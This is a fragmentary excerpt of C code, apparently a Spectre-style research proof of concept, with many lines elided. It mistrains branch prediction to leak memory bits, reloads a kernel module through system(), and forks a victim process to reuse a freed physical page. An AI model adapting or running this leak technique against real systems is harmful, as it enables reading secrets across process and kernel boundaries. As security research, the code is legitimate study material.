...
int leak_bit(uint64_t offset_from_buffer, int bit) {
  ...
  for (int i = 0; i < SPECTRE_ITERS; i++) {
    params.offset =
        offset_from_buffer *
        (i / (SPECTRE_ITERS - 1)); // 4 iterations of in-bounds accesses (->
                                   // mistraining) and last one is out-of-bounds
    flush(&spectre_buf[0]);
...
int main(int argc, char **argv) {
  ...
  // setup spectre stuff
  system("rmmod spectre_module; cd kernel_module && make; insmod "
         "spectre_module.ko");
  uint64_t buf_addr;
  ...
  spectre_buf = mmap(NULL, PAGE_SIZE * 3, PROT_READ | PROT_WRITE,
  ...
  for (int i = 0; i < REPEATS; i++) {
    ...
    uint8_t *buf = mmap(NULL, PAGE_SIZE * PAGES, PROT_READ | PROT_WRITE,
                        MAP_ANONYMOUS | MAP_POPULATE | MAP_PRIVATE, -1, 0);
...
// find physical addresses (and collect some statistics)
    ...
    usleep(100000);
    // start victim (which will hopefully re-allocate the correct page that was
    // previously freed)
    int pid = fork();
    int status;
    if (!pid) {
